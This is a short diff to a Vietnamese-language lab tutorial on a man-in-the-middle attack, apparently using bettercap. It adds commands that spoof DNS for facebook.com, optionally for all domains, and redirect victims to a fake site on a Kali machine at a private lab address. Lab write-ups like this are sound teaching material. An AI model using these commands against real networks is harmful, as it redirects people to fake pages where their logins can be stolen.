@@ -138,3 +138,10 @@ Gói tin từ Victim -> chuyển bình thường -> sẽ không còn ```endpoint
 
 <img src="../assets/src_set_dns.png" width="512"> 
 
+```set dns.spoof.domains facebook.com```       # Chọn domain cần giả mạo
+
+```set dns.spoof.address 192.168.200.129``    # Trỏ về IP web giả (máy Kali)
+
+```set dns.spoof.all true```                   # Cho phép spoof mọi domain (tùy chọn)
+
+```dns.spoof on```                             # Bật tính năng DNS spoofing
